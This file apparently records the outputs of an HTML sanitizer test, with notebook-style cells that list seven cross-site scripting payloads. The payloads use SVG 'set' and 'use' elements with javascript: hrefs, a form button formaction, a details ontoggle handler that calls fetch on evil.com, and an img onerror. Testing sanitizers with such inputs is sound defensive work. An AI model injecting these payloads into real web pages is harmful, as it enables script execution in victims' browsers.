# %%
# Payload 1
# Out:
# <svg><a><set attributename="href" to="javascript:alert(1)"></set></svg>

# %%
# Payload 2
# Out:
# <svg><foreignObject><form><button formaction="javascript:alert(1)">click</button></form></foreignObject></svg>

# %%
# Payload 3
# Out:
# <template><svg><set attributename="href" to="..."></set></svg></template>

# %%
# Payload 4
# Out:
# <svg><a><set attributename="href" to="http://evil.com/" begin="0s"></set><rect width="200" height="100"/></a></svg>

# %%
# Payload 5
# Out:
# <details open ontoggle="fetch('http://evil.com/')"><summary>test</summary></svg><svg onload=""></svg></details>

# %%
# Payload 6
# Out:
# <svg><foreignObject><div><img src=x onerror=""></div></foreignObject></svg>

# %%
# Payload 7
# Out:
# <svg><use href="javascript:alert(1)"></use></svg>
